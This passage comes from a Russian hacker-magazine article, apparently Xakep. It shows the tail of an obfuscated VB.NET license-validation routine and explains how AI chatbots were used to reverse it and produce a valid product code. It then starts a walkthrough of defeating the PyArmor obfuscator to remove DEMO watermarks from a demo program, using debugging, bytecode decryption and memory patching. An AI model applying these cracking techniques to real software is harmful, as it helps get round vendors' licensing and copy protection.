Module1.vtm, Strings.Len(Module1.vtm) \ 5 + 4, 1)) + 42 Then
                    text2 = Strings.Right(text2, Strings.Len(text2) \
3) & Math.Floor(Math.Sqrt(num10 + 201)).ToString()
                End If
            End If


            If num9 = 3 AndAlso Module1.v23 <> "" Then
                Module1.x1 = 3 : Module1.x2 = 20 : Module1.x3 = 41 :
Module1.x4 = 12 : Module1.x5 = 19
            End If


            ' Основная логика преобразования
            If num10 < Module1.x4 Then
                text3 &= (Val(Strings.Mid(text2, num10, 1)) + num10 +
3 + Math.Floor(Math.Sqrt(num10 + 3))).ToString()
            Else
                text3 &= (Val(Strings.Mid(text2, num10, 1)) + num10 *
Module1.x1 + num10 * Module1.x4 + Math.Floor(Math.Sqrt(num10 + 2))).
ToString()
            End If


            If num9 = 2 AndAlso (Module1.AscWv(Strings.Mid(Str,
Strings.Len(Str) - 2, 1)) < 48 OrElse
                (Module1.AscWv(Strings.Mid(Str, Strings.Len(Str) - 2,
1)) > 57 AndAlso
                Module1.AscWv(Strings.Mid(Str, Strings.Len(Str) - 4,
1)) < 48) OrElse
                Module1.AscWv(Strings.Mid(Str, Strings.Len(Str) - 4,
1)) > 57) Then
                text3 = (Val(Strings.Mid(text2, num10, 1)) + num10 +
3 + Math.Floor(Math.Sqrt(num10 + 3))).ToString()
            End If
        Next


        ' Дополнительная обработка
        text3 = Strings.StrReverse(text3) & Strings.StrReverse(text2)
        text2 = ""


        For num10 As Integer = 0 To 1
            If num9 = 4 AndAlso Val(Module1.Nsa(19)) <> Module1.AscWv
(Strings.Mid(Module1.gl1, Strings.Len(Module1.gl1) \ 3 + 3, 1)) + 42
Then
                text2 &= Strings.Mid(text3, 1, 1) & Strings.Mid(
Strings.StrReverse(text3), 1, 1)
            End If
        Next


        ' Финальная обработка строки
        For num10 As Integer = 1 To Strings.Len(text3)
            If Val(Strings.Mid(text3, num10, 2)) < Module1.x5 Then
                text2 &= Strings.Mid(text3, num10, 1)
            ElseIf num10 > 5 Then
                text2 &= (Val(Strings.Mid(text3, num10, 1)) + num10 *
Module1.x2 +
                         Val(Strings.Mid(text3, num10 - 1, 1)) + Math
.Floor(Math.Sqrt(num10 + 1))).ToString()
            Else
                text2 &= Strings.Mid(text3, num10, 1) & Strings.Mid(
Strings.StrReverse(text3), num10, 1)
            End If
        Next


        For num10 As Integer = 1 To Strings.Len(text3)
            If Val(Strings.Mid(text3, num10, 2)) < Module1.x5 Then
                text2 &= Strings.Mid(text3, num10, 1)
            ElseIf num10 > 5 Then
                text2 &= (Val(Strings.Mid(text3, num10, 1)) + num10 *
Module1.x4 +
                         Val(Strings.Mid(text3, num10 - 1, 1))).
ToString()
            Else
                text2 &= Strings.Mid(text3, num10, 1) & Strings.Mid(
Strings.StrReverse(text3), num10, 1) &
                        (Val(Strings.Mid(text3, num10, 1)) + num10 *
Module1.x4).ToString() &
                        Math.Floor(Math.Sqrt(num10 + 3)).ToString()
            End If
        Next


        ' Извлечение каждого 10-го символа
        Module1.a24 = ""
        For num10 As Integer = 1 To Strings.Len(text2) Step 10
            Module1.a24 &= Strings.Mid(text2, num10, 1)
        Next
        text2 = Module1.a24


        ' Байтовое преобразование
        Module2API.WorkArray = New Byte(Strings.Len(text2)) {}
        For num10 As Integer = 1 To Strings.Len(text2)
            Module2API.WorkArray(num10) = CByte(Strings.Mid(text2,
num10, 2))
        Next
        Module2API.CCD(Module2API.WorkArray, 0)


        text2 = ""
        For num10 As Integer = 1 To Module2API.WorkArray.Length - 1
            text2 &= Module2API.WorkArray(num10).ToString()
        Next


        Module1.bufa = text2
        Module2API.Arrays = New String(Strings.Len(text2)) {}


        For num10 As Integer = 1 To Strings.Len(text2)
            Module2API.Arrays(num10) = Module1.AscWv(Strings.Mid(
text2, num10, 1)).ToString()
        Next


        ' Повторное преобразование массива
        For num5 As Integer = 0 To Module2API.Arrays.Length - 1
            Module2API.WorkArray1 = New Byte(Module2API.Arrays(num5).
Length) {}
            For num7 As Integer = 1 To Module2API.Arrays(num5).Length
                Dim charCode As Integer = Module1.AscWv(Module2API.
Arrays(num5)(num7 - 1))
                Select Case charCode
                    Case 50
                        Module2API.WorkArray1(num7) = CByte(charCode
+ 47)
                    Case 53
                        Module2API.WorkArray1(num7) = CByte(charCode
+ 40)
                    Case 55
                        Module2API.WorkArray1(num7) = CByte(charCode
- 17)
                    Case 56
                        Module2API.WorkArray1(num7) = CByte(charCode
+ 32)
                    Case Else
                        Module2API.WorkArray1(num7) = CByte(charCode)
                End Select
            Next
            Module2API.CCD(Module2API.WorkArray1, 1)


            Module2API.Arrays(num5) = Module2API.WorkArray1(1).
ToString()
            For num7 As Integer = 2 To Module2API.WorkArray1.Length -
1
                Module2API.Arrays(num5) &= (CDbl(Module2API.
WorkArray1(num7)) +
                                           Math.Floor(Math.Sqrt(
Module2API.WorkArray1(num7) + num7))).ToString()
            Next
        Next


        ' Дополнительная обработка коротких строк
        If Strings.Len(text2) < 25 Then
            text2 = text2 & text2 & Math.Floor(Math.Sqrt(Strings.Len(
text2) + 5)).ToString()
        End If


        If num9 = 1 Then
            Module1.vtm = text2
        End If


        ' Специальная обработка для num3
        If Val(Strings.Mid(text2, Strings.Len(text2) \ 2, 1)) > 5
Then
            num3 = CInt(Math.Round(Val(Strings.Mid(text2, Strings.Len
(text2) \ Module1.x3, 1))))
            If num3 >= 10 OrElse num3 < 0 Then num3 = 0
        End If


        ' Сборка финальной строки
        Module1.Selectors = 0
        Select Case num9
            Case 0
                Module1.Selectors = 1
                Do
                    If Val(Module1.q9(0)) = Module1.AscWv(Strings.Mid
(text2, Strings.Len(text2) \ 4 + 1, 1)) + 42 AndAlso
                       Val(Module1.q9(1)) = Module1.AscWv(Strings.Mid
(text2, Strings.Len(text2) \ 3 + 3, 1)) + 42 Then
                        Module1.y11 = 35
                    Else
                        text2 = Strings.Right(text2, Strings.Len(
text2) \ 2)
                    End If


                    If Val(Module1.q9(2)) = Module1.AscWv(Strings.Mid
(text2, Strings.Len(text2) \ 2 + 2, 1)) + 42 AndAlso
                       Val(Module1.q9(3)) = Module1.AscWv(Strings.Mid
(text2, Strings.Len(text2) \ 5 + 4, 1)) + 42 Then
                        Module1.y11 = 35
                    Else
                        text2 = Strings.Left(text2, Strings.Len(text2
) \ 2)
                    End If
                    Module1.Selectors += 1
                Loop While Module1.Selectors <= 1


            Case 1
                If num9 = 4 Then
                    text3 &= Strings.Mid(text2, Strings.Len(text2) \
1 + 1, 1)
                    text3 &= Strings.Mid(text2, Strings.Len(text2) \
5 + 3, 1)
                    If Module1.StrTrimFix(text2, 1) = 1 Then
                        text3 &= Strings.Mid(text2, Strings.Len(text2
) \ 1 + 1, 1)
                    End If
                    text3 &= Strings.Mid(text2, Strings.Len(text2) \
5 + 2, 1)
                    text3 &= Strings.Mid(text2, Strings.Len(text2) \
2 + 4, 1)
                End If


                If Val(Module1.q9(5)) = Module1.AscWv(Strings.Mid(
text2, Strings.Len(text2) \ 2 + 2, 1)) + 42 AndAlso
                   Val(Module1.q9(6)) = Module1.AscWv(Strings.Mid(
text2, Strings.Len(text2) \ 5 + 1, 1)) + 42 Then
                    Module1.y11 = 35
                Else
                    result = "Error"
                End If


            Case 2
                If Val(Module1.q9(12)) = Module1.AscWv(Strings.Mid(
text2, Strings.Len(text2) \ 4 + 1, 1)) + 42 AndAlso
                   Val(Module1.q9(13)) = Module1.AscWv(Strings.Mid(
text2, Strings.Len(text2) \ 3 + 3, 1)) + 42 Then
                    Module1.y11 = 35
                Else
                    text2 = Strings.Right(text2, Strings.Len(text2) \
3)
                End If


                Module1.v23 = ""
                If Val(Module1.q9(14)) = Module1.AscWv(Strings.Mid(
text2, Strings.Len(text2) \ 2 + 2, 1)) + 42 AndAlso
                   Val(Module1.q9(15)) = Module1.AscWv(Strings.Mid(
text2, Strings.Len(text2) \ 5 + 4, 1)) + 42 Then
                    Module1.y11 = 35
                Else
                    Module1.v23 = text2
                End If


            Case 3
                If num9 = 1 Then
                    text3 &= Strings.Mid(text2, Strings.Len(text2) \
2 + 1, 1)
                    text3 &= Strings.Mid(text2, Strings.Len(text2) \
3 + 3, 1)
                    If Module1.StrTrimFix(text2, 1) = 1 Then
                        text3 &= Strings.Mid(text2, Strings.Len(text2
) \ 1 + 1, 1)
                    End If
                    text3 &= Strings.Mid(text2, Strings.Len(text2) \
3 + 2, 1)
                    text3 &= Strings.Mid(text2, Strings.Len(text2) \
4 + 4, 1)
                End If


            Case 4
                If Val(Module1.q9(26)) <> Module1.AscWv(Strings.Mid(
text2, Strings.Len(text2) \ 2 + 2, 1)) + 42 Then
                    text2 = Strings.Left(text2, Strings.Len(text2) \
4)
                End If
        End Select


        ' Финальная сборка результата
        text3 &= Module2API.Arrays(Strings.Len(text2) \ 4 + 1)
        text3 &= Module2API.Arrays(Strings.Len(text2) \ 3 + 3)
        If Module1.StrTrimFix(text2, 1) = 1 Then
            text3 &= Module2API.Arrays(Strings.Len(text2) \ 5 + 1)
        End If
        text3 &= Module2API.Arrays(Strings.Len(text2) \ 2 + 2)
        text3 &= Module2API.Arrays(Strings.Len(text2) \ 5 + 4)


        If num3 = 0 Then
            text3 &= Module2API.Arrays(12)
        Else
            text3 &= array(num3)
        End If


        If num9 = 3 Then
            Module1.gl1 = Module1.bufa
        End If


        If num9 = 0 Then
            result = text3
        Else
            result &= array(10) & text3
        End If
    Next


    ' Финальное преобразование результата
    Dim array2(Strings.Len(result)) As String
    For num10 As Integer = 1 To Strings.Len(result)
        array2(num10) = Module1.AscWv(Strings.Mid(result, num10, 1)).
ToString()
    Next


    Module2API.WorkArray1 = New Byte(array2.Length - 1) {}
    For num5 As Integer = 1 To array2.Length - 1
        Module2API.WorkArray1(num5) = CByte(array2(num5))
    Next


    Module2API.CCD(Module2API.WorkArray1, 1)
    Module2API.WorkArray = New Byte(0) {}


    Module1.y17 = ""
    For num7 As Integer = 1 To Module2API.WorkArray1.Length - 1
        If num7 > 25 AndAlso num7 < 51 Then
            Module1.y17 &= Math.Floor(Math.Sqrt(Module2API.WorkArray1
(num7) + Module2API.WorkArray1.Length + num7)).ToString()
        Else
            Module1.y17 &= (CDbl(Module2API.WorkArray1(num7)) + Math.
Floor(Math.Sqrt(Module2API.WorkArray1(num7) + num7))).ToString()
        End If
    Next


    ' Финальная обработка строки
    Dim text4 As String = ""
    For num10 As Integer = 1 To Strings.Len(Module1.y17)
        If num10 < Strings.Len(Module1.y17) - 4 Then
            text4 &= (Math.Floor(Math.Sqrt(Val(Strings.Mid(Module1.
y17, num10, 2)))) +
                     num10 * Math.Floor(Math.Sqrt(Val(Strings.Mid(
Module1.y17, num10, 2)))) +
                     num10 * Val(Strings.Mid(Module1.y17, num10 + 2,
1)) +
                     Val(Strings.Mid(Module1.y17, num10 + 3, 1))).
ToString()
        Else
            text4 &= Val(Strings.Mid(Module1.y17, num10, 1)).ToString
()
        End If
    Next


    Return Strings.StrReverse(text4)
End Function




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
   КРИПТОУРАВНЕНИЕ
         РЕШАЕМ НЕЛИНЕЙНУЮ ЗАДАЧУ
               ВАЛИДАЦИИ ЛИЦЕНЗИЙ
               И ОБХОДИМ ЛОВУШКИ
                      ОБФУСКАТОРА




Можно, конечно, попросить ИИ словами объяснить суть алгоритмов, но так
будет еще хуже: искусственный разум выдает общие фразы про сложения
строк, перестановки символов и прочую словесную шелуху, теряя главную
суть, которой мы от него добиваемся, — как решить это ужасное на вид крип‐
тоуравнение.
   Попробуем объяснить ему, что конкретно мы хотим услышать: для начала
спросим про реверсируемость обеих функций. В этом случае ИИ нас понима‐
ет и выдает конкретный недвусмысленный ответ: нет, каждая функция пред‐
ставляет собой хеш от входных строк, восстановить который по результату
невозможно из‑за потери информации в процессе хеширования. И даже ука‐
зывает на конкретные шаги, где эта информация теряется.
   Во‑первых,  это  многократное  использование  в  обоих  алгоритмах
нереверсируемой функции Module2API.CCD. По этой причине я не буду при‐
водить ее (тоже весьма немаленький) код, скажу только, что эта функция
переводит первый параметр — строку — в бинарный массив, который затем
возвращает в Module2API.WorkArray1 , при этом преобразовании теряя зна‐
чащие биты. Во‑вторых, весьма  часто используемые в  обеих  функциях
полиномы с целочисленными квадратными корнями сильно теряют информа‐
цию при округлении. И наконец, самое главное: в обеих функциях финальная
обработка собирает возвращаемую строку (условно назовем ее, как в пер‐
вом фрагменте кода, finalResult ) из цифр промежуточной строки temp
по примерной формуле:


finalResult[j++]=a + (i + 1) * a + (i + 1) * b + c

Здесь a — двузначное десятичное число, образованное цифрами temp[i]
и temp[i+1] ; b — однозначное десятичное число temp[i+2] ; c — однознач‐
ное десятичное число temp[i+3] .
   Понятное дело, что восстановить исходные элементы temp из такого
ламерского хеша невозможно, тем более что 4-байтовое окно перемещается
не группами по 4, а всего лишь на 1 байт за каждый шаг. Однако при выяс‐
нении этих обстоятельств у нас наконец появляются и хорошие новости. Нес‐
мотря на принципиальные различия в структуре функций, финальные пре‐
образования результирующего хеша в обеих (начиная с шагов «Повторная
обработка  объединенной  строки» Cval и  «Финальное  преобразование
результата» Lenstr) алгоритмически идентичны, то есть из уравнения их мож‐
но исключить.
  На первый взгляд кажется, что мы не сильно много выгадали: код (как
минимум Lenstr) уменьшился некритично, да и хеши все равно остались
необратимыми — в получившемся коде и CCD, и квадратные корни все равно
присутствуют. Тем не менее код функции Cval уже готов для того, чтобы ИИ
попытался снова донести до нас его смысл. И результат, действительно, ока‐
зывается более‑менее понятным! Цитирую дословно:


      Общая схема работы
        Это функция одностороннего  преобразования  строки. С самого«
      начала он был спроектирован исключительно по принципу «безопас‐
      ность через неясность»: разработчики специально сделали его мак‐
      симально странным и непохожим на стандартные алгоритмы и накида‐
      ли как можно больше запутывающих, но совершенно бесполезных
       операций.
        1. Входная строка разбивается на отдельные символы
        2. Каждый символ  обрабатывается полностью независимо от всех
          остальных символов
        3. Несколько слоев тривиальной обфускации
        4. Все результаты склеиваются в одну большую строку = готовый хеш
                »
То есть, говоря уж совсем простыми словами, каждый символ входной строки
необратимо хешируется, и из полученных хешей склеивается результиру‐
ющий хеш, состоящий из десятичных цифр. А входная строка этой функции,
как ты помнишь, у нас левая часть product code из пяти групп по пять сим‐
волов, разделенных разделителями -. И уж совсем радует то, что никаких опе‐
раций с группами символов или даже фильтром разделителей алгоритм
не предусматривает, — код зашифрован банальным подстановочным шиф‐
ром, необратимым из‑за переменного количества символов в подстановоч‐
ной последовательности и неоднозначности соответствия. А значит, и в
левой части уравнения Cval на этапе «Повторная обработка объединенной
строки»  должен  генерироваться  зашифрованный  аналогичным  образом
готовый код продукта.
   Давай еще раз внимательно взглянем на алгоритм Cval . Можно снова
попросить ИИ помочь, но в свете посетившего нас прозрения это уже
излишне — сразу бросается в глаза и цикл от 0 до 4, в котором формируются
четыре символьные группы (этап «Основной цикл обработки» в приведенном
фрагменте кода) и создается алфавит для подстановочного шифра, иден‐
тичного Lenstr (этапы «Преобразование массива символов» для массива
спецсимволов  SLYVWKMFXQ-  и  «Повторное  преобразование  массива»
для каждого символа кода). Затем выполняется сборка группы из полученных
символов подстановочного алфавита (этап «Финальная сборка результата»).
   Собственно, мы уже можем обойтись без ИИ, чтобы своими словами
сформулировать суть алгоритма хеширования Lenstr: для каждой из пяти
групп символов кода продукта выбирается пять целочисленных коэффици‐
ентов x1 — x5, при помощи которых путем длительных и головоломных
манипуляций создается массив Arrays. Его элементами являются подста‐
новочные строки, состоящие из десятичных цифр и соответствующие сим‐
волам product code. Четыре первых символа группы формируются по фор‐
муле: первый символ — Arrays[Len(text2) / 4 + 1] , второй — Arrays[
Len(text2) / 3 + 3] , третий — Arrays[Len(text2) / 2 + 2] и чет‐
вертый — Arrays[Len(text2) / 5 + 4] .
   Последний символ группы формируется по‑хитрому — в зависимости
от текущего значения num3 выбирается или один из десяти закодированных
спецсимволов, или (если num3 не в этом диапазоне) Array[12]. Полученные
группы разделяются закодированными символами  -, и от итоговой пос‐
ледовательности вычисляется хеш, аналогичный Cval . Схематично алгоритм
валидации имени пользователя и кода продукта выглядит вот так.





Зеленым и розовым выделены алгоритмически идентичные блоки кода. Жел‐
тым — необратимые (но аналогичные) участки кода, на которые можно сок‐
ратить криптоуравнение для того, чтобы на выходе сравнивались незако‐
дированные product code. Уравнение было бы решено, но остался очень неп‐
риятный момент, про который мы говорили в самом начале: его левая часть
тоже зависит от product code. На схеме видно, что производный от options
массив q9 (точнее, его элементы 0, 1, 2, 3, 5, 6, 7, 9, 12, 13, 14, 15 и 26) дей‐
ствительно существенно влияют на различные жизненно важные участки
алгоритма, все ИИ дружно указывают на это прискорбное обстоятельство.
   Между тем практика как будто не подтверждает этот факт — подставляя
различные значения в options на выходе, мы получаем одинаковые значения
хеша Lenstr при фиксированном Str. Конечно, галлюцинирование ИИ —
вполне нормальное явление, но тут здравый смысл подсказывает, что он
прав,  однако  это  противоречит нашим  наблюдениям.  Разрешить  этот
парадокс мы снова доверим ИИ — по обычной схеме общения с ним
в непонятных ситуациях. Инвертируем вопрос: «Почему значение функции
Lenstr не зависит от параметра options ?» Его ответ слегка проясняет
положение:


        Коротко: параметр options в этой функции — это муляж .
     Он действительно разбирается и даже активно используется в коде,«
      но используется только в проверках , а не в вычислениях. От его
       значения итоговая строка никак не зависит.
      Для большинства входных данных options (кроме, возможно, некото‐
      рой очень специфической «магической» строки, которая бы удовлетво‐
      рила сложным внутренним условиям) функция всегда будет возвра‐
      щать результат, который основан на обработке строки "Error", что
       делает его практически не зависящим от options .                »
С точки зрения нашей логики этот ответ — электронное лукавство. Конечно
же, итоговая строка зависит от этих проверок, поскольку от них как минимум
зависит промежуточная строка text2 . Точнее, ее длина, прямо влияющая
на формирование каждой группы символов. Кроме того, нетрудно видеть, что
все боты хватают строку result = "Error" как наживку, в то время как сами
же высказывают предположение, что строка эта отвлекающая. Тем не менее
искусственный интеллект подсказывает, что ведь и вправду все влияние
options на конечный результат — это промежуточные проверки в коде
на совпадение вышеперечисленных символов с соответствующими сим‐
волами, генерируемыми функцией product code . Для проверки этой гипоте‐
зы убираем из кода ветку с result = "Error" и снова задаем ИИ тот же воп‐
рос. На этот раз результат логичен и исчерпывающ:
 • Если ключ  правильный: условие If не срабатывает, алгоритм идет
   по стандартному пути. Результат одинаковый.
 • Если ключ неправильный: данные намеренно «портятся» (обрезаются)
   и на выходе получается мусор.

Таким образом, options работает как бинарный переключатель: «выдать пра‐
вильный результат» (если ключ верный) или «выдать ошибку/мусор» (если
неверный).
   Остается последний шаг — внимательно смотрим, какие из зависящих
от option проверок истинны при правильном значении кода (это проверки
символов 0, 1, 2, 3 первой группы), и оставляем от них только истинную ветку
кода, а на остальных — ложную. Полученной функцией генерируем product
code , который для проверки подставляем в исходный код. Бинго — хеши
от Lenstr и Cval совпадают, задача полностью решена.
  И как всегда, в заключение я выскажу свое мнение по поводу этого алго‐
ритма, сформированное без участия искусственного интеллекта. Алгоритм
на профессиональный не тянет от слова совсем: он мало того что, как мы
убедились выше, симметричный, так еще вдобавок не криптостойкий —
количество возможных коллизий (причем и ложнонегативных, и ложнопози‐
тивных) просто зашкаливает. Тем не менее его разбор может сильно попор‐
тить кровь начинающему реверсеру.
   Как видишь, помимо простой самописной обфускации, он нафарширован
всевозможными отвлекающими вычислениями, логически недоступными вет‐
ками кода, вычисляемыми косвенно, что сбивает с толку не только живого
реверсера, но и искусственный интеллект. Например, как показано выше,
совершенно простой и дубовый прием с result = "Error" ввел в заблужде‐
ние буквально все модели ИИ, которым я его скармливал. В итоге меня тер‐
зают смутные сомнения: а не использовали ли сами разработчики ИИ
для генерации всех этих многочисленных ловушек? Судя по всему, война
роботов ближе, чем мы думаем. © X
ВЗЛОМ





Сегодня мы разберем PyArmor — популяр‐
ный обфускатор для  Python-приложений.
На примере демоверсии реальной прог‐
раммы с надоедливыми вотермарками мы                                                                               JaboHack
выясним,  почему  старые методы  деоб‐
фускации больше не работают, поборемся
с    двухуровневым    AES-шифрованием
байт‑кода и найдем способы патча кода
прямо в памяти — без полного восстанов‐
ления исходников.


Тебе, вероятно, уже надоело обсуждать деобфускацию .NET-приложений,
поэтому попробуем вернуться к другому распространенному и популярному
в определенных кругах продукту — Python. В свое время мы разбирали
реверс скомпилированного байт‑кода, обычного , кастомного и даже ском‐
пилированного в натив . Однако, как я уже говорил в предыдущей статье
про .NET, тема очень обширная и неисчерпаемая. Конечно, это справедливо
и для Python.
  В этот раз мы обсудим известный обфускатор PyArmor, до которого у нас
до сих пор руки не доходили. Обфускатор этот действительно известный,
про него умные люди сочинили множество обзоров и наснимали большое
количество туториалов по реверсу. Казалось бы, и делать нам тут особо
нечего. Но время идет, защиты совершенствуются, так что попробуем выяс‐
нить, как обстоят дела с этим обфускатором на текущий момент.
   Ставим задачу по привычной схеме: дано некое графическое приложение,
точнее демоверсия приложения, которая отличается от рабочей тем, что
на выходе поперек результирующей картинки появляется множество раздра‐
жающих надписей «DEMO», от которых неплохо было бы избавиться.





По традиции запрашиваем у Detect It Easy его мнение о природе нашего при‐
ложения и получаем ответ:


  PE64
  Operation system: Windows(Vista)[AMD64, 64-bit, GUI]
  Linker: Microsoft Linker(14.50.35222)
  Compiler: Microsoft Visual C/C  (19.50.35222)[C]
  Language: Python(3.10)
  Tool: Microsoft Visual Studio(2026, 18.00)
  Packer: PyInstaller[overlay]
  (Heur)Packer: Generic[Section #5 (".rsrc") compressed   Strange overlay]
  Overlay: Binary(Store)[Offset=0x00049c00,Size=0x01720493]
  Archive: Raw Deflate stream[@02h]
  Data: ZLIB data[ZLIB compression best]

На первый взгляд, перед нами классический случай использования пакета
PyInstaller, завернутого в исполняемый exe-модуль. Мы такие разбирали
в статье « Змеиная анатомия. Вскрываем и потрошим PyInstaller ». Если ты
забыл или пропустил эту статью, напомню, что для разбора подобных пакетов
на составляющие файлы я советовал применить утилиту PyInstaller Extractor
или лучше Pydumpck , который вдобавок пытается по мере возможности
декомпилировать .pyc-модули в исходный питоновский код.
   Pydumpck (выдав попутно множество предупреждений) вполне справляет‐
ся с поставленной задачей, распаковывает из нашего exe-файла целый
каталог с разнообразными библиотеками.





Полученные таким способом исходники имеют две основные проблемы: хоть
они и очень похожи на настоящие, но не работают — запущенный главный
модуль (на скриншоте выделен) при запуске ругается на отсутствие импорти‐
руемой функции:


ImportError: cannot import name '__pyarmor__' from 'pyarmor_runtime_
000000' (unknown location)

Вдобавок при ближайшем рассмотрении лежащего рядом декомпилирован‐
ного файла становится видно, что, кроме вызова этой функции, являющейся
оберткой зашифрованного кода, в модуле нет вообще ничего:


from pyarmor_runtime_000000 import __pyarmor__
__pyarmor__(__name__, __file__, b'PY000000\x00\x03\n\x00o\r\r\n...')

На этом этапе уже очевидно, что нужно усиленно копать в сети на предмет
инструкций по реверсу этого приложения. И их действительно великое мно‐
жество! Как принято у молодых амбициозных хакеров, в основном это ютубов‐
ские видеоролики, раздражающие меня крайним неудобством подачи тех‐
нической информации. Поэтому выбираем в качестве базового источника
статью с «Гитхаба» , как самую толковую, хотя и несколько винтажную: четыре
года прошло с тех пор, как проект перестал обновляться. Она предлагает аж
целых три метода восстановления кода, обфусцированного PyArmor. Два
из них предполагают дамп запущенного приложения, третий вроде как поз‐
воляет вытащить код без запуска анализируемой программы.
   Однако, попробовав применить эти способы на практике, мы обнаружи‐
ваем, что не все так шоколадно, как казалось. Проблема возникает сразу же:
утилита Process Hacker 2, рекомендуемая автором для инъекции кода в при‐
ложение, за прошедшее время превратилась в тыкву под названием System
Informer, при этом ее жестоко кастрировали, убрав именно тот инструмент,
который нам был нужен, — Inject DLL. Разумеется, на торрентах еще остался
исходный вариант этого инструмента, но в итоге и он нам не помогает. То ли
формат инъекции PyInjector устарел (ему тоже пять лет), то ли PyArmor таки
научился с подобными вещами бороться, но при попытке инъекции прог‐
рамма избавляется от внедренного PyInjector максимально быстро, никакого
дампа сделать не удается.
   Первые два метода для нас не годятся, не годится и третий. Как выясняет‐
ся, автор слукавил, сказав, что запускать он ничего не будет: по факту он
все‑таки пытается запустить считанный из .pyc-файла маршализированный
объект через exec . Естественно, ничего у него не выходит, по причине того,
что (как я уже говорил выше) модулю для нормальной загрузки не хватает
внешней функции __pyarmor__ . Судя по описанию, в ранних версиях она
содержалась в модуле _pytransform.pyd, который входит в стандартный
дистрибутив PyArmor и распаковывается из пакета PyInstaller. Сейчас же она
находится   в  модуле  pyarmor_runtime_000000/pyarmor_runtime.pyd,
который, похоже, тоже сменил свой формат и поэтому работать вместо
_pytransform.pyd не хочет.
  Не подходят в качестве замены и входящие в актуальный дистрибутив
PyInstaller модули pyarmor_runtime.pyd и pytransform3.pyd, которые мы
тоже пробуем использовать для очистки совести. Просмотр пары роликов
укрепляет наши опасения: судя по всему, за прошедшую пятилетку PyArmor
если не радикально, то весьма серьезно сменил свой алгоритм, чтобы пред‐
лагаемые ранее методы его лечения не просто не работали, но даже не были
базой, от которой можно отталкиваться для допиливания деобфускатора.
   Поэтому не теряем времени на погружение в чужую логику дампа и деоб‐
фускации (у нас, повторяю, цель другая — анализ и патч конкретного при‐
ложения) и следуем своим собственным путем, начало которого я указал
в статье « Змеиная анатомия. Вскрываем и потрошим PyInstaller ». Берем наш
любимый отладчик x64dbg, аттачимся им к запущенному процессу и прерыва‐
ем  его  (благо  программа  любезно  предоставляет  нам  модальный
MessageBox для удобства этого действия). Проанализируем стек возвратов.





Как обычно, в стеке порядок вложенных вызовов виден как на ладони. Вверху
стека — питоновская реализация ctypes.windll.user32.MessageBoxW , вни‐
зу — вызов питоновской виртуальной машины python310 из основной прог‐
раммы. Самый  большой  интерес  представляет  вызов  интерпретатора
из PyArmor’овской библиотеки pyarmor_runtime.pyd. При ближайшем рас‐
смотрении он выглядит так.





По сути, это запуск уже расшифрованного с помощью pyarmor_runtime мар‐
шализированного объекта через PyEval_EvalCode. В этом легко убедиться,
поставив точку останова на найденный интерпретатор, который не сильно
отличается от версии, описанной в статье « Змеиная анатомия. Вскрываем
и потрошим PyInstaller »:


00007FF94173450C | mov qword ptr ss:[rsp+48],r13
00007FF941734511 | cmp dword ptr ss:[rbp+C0],0
00007FF941734518 | mov rbx,qword ptr ss:[rsp+50]
00007FF94173451D | mov r14,qword ptr ss:[rsp+78]
00007FF941734522 | mov r12,qword ptr ss:[rsp+70]
00007FF941734527 | jne python310.7FF94173D6BE
00007FF94173452D | mov r9,qword ptr ss:[rbp-70]
00007FF941734531 | mov rax,rbx
00007FF941734534 | sub rax,r9
00007FF941734537 | sar rax,1
00007FF94173453A | mov dword ptr ds:[r14+60],eax
00007FF94173453E | movzx esi,word ptr ds:[rbx]    ;
esi <- байт-код текущей команды
00007FF941734541 | movzx edi,sil
00007FF941734545 | shr esi,8
00007FF941734548 | add rbx,2
00007FF94173454C | mov dword ptr ss:[rsp+40],esi
00007FF941734550 | mov qword ptr ss:[rsp+50],rbx
00007FF941734555 | mov r15,r13
00007FF941734558 | mov qword ptr ss:[rbp-80],r13
00007FF94173455C | lea r10,qword ptr ds:[7FF941710000]
00007FF941734563 | jmp python310.7FF9417344D0

Каким образом pyarmor_runtime расшифровывает байт‑код? Рассмотрим
вызов (ниже выделенного места) pyarmor_runtime из интерпретатора. Пос‐
тавив туда точку останова, мы убеждаемся в том, что это и есть вызов фун‐
кции __pyarmor__ со строкой зашифрованного кода в качестве третьего
параметра. Проанализировав при помощи IDA путь, который эта строка про‐
делывает от входа __pyarmor__ до вызова PyEval_EvalCode , где она уже
расшифрована, мы достаточно быстро находим декриптор. Судя по ссылкам
на исходники, это AES.





Причем это не окончательная расшифровка: сдампив средствами x64dbg
расшифрованный модуль, мы снова видим, что он не запускается и даже
не декомпилируется. Байт‑код расшифрован лишь частично, хотя строки
и даже названия методов и переменных в нем уже читаемы, что, безусловно,
прогресс.





Хотя модуль по‑прежнему не декомпилируется, мы смутно замечаем в нем
название метода add_watermark и даже текстовую константу DEMO , которая
используется в качестве водяного знака. Первая мысль, которая приходит
в голову, — прямо на этом этапе заменить это слово пустой строкой или про‐
белами, чтобы сделать вотермарку невидимой. К сожалению, этот вариант
не подходит — после замены программа ругается и валится с исключением.





К подобному эффекту приводит замена пробелов любыми непечатаемыми
символами — хитрый автор программы считает размеры поля водяного знака
в пикселях и использует их как аргумент конструкции range . Поэтому простой
заменой строки тут не отделаться, нужно восстанавливать код полностью.
  Для этого попробуем проследить, как интерпретируется частично рас‐
шифрованный __pyarmor__ при вызове PyEval_EvalCode . Для этого сразу
после расшифровки ставим точку останова на выборку байт‑кода и смотрим,
что интерпретатор делает по шагам. Начало каждого метода выглядит при‐
мерно так.





Выделенный начальный фрагмент выглядит и выполняется как нормальный
байт‑код. Из‑за неудобства его быстрой декомпиляции (и даже дизассем‐
блирования) нам придется проделать это руками, вспомнив информацию
о принципах построения байт‑кода, полученную в статьях « Змеиная ана‐
томия. Вскрываем и потрошим PyInstaller » и « Нетипичная змея. Реверсим
приложение на Python c кастомным интерпретатором ». Напомню в двух сло‐
вах: каждая команда занимает два байта, первый из которых — опкод ( 01h —
POP_TOP , 09h — NOP, 64h — LOAD_CONST , 83h — CALL_FUNCTION ,  ...). Сле‐
дующий байт — параметр, да‑да, у NOP тут тоже есть параметры. В общем,
наша последовательность дизассемблируется так:


NOP 35h
NOP A1h
NOP 96h
NOP 0Fh
LOAD_CONST 02h
NOP 3Ch
NOP 17h
LOAD_CONST 03h
CALL_FUNCTION 01h
POP_TOP

Дальше идет безумный или зашифрованный код. Честно говоря, даже стар‐
товый фрагмент на осмысленный код мало похож и отдает какой‑то дичью,
случайно интерпретированной как байт‑код. Однако эта дичь нам что‑то
смутно напоминает. А напоминает она нам  процитированный в статье
на «Гитхабе» фрагмент документации по PyArmor (судя по всему, ныне уда‐
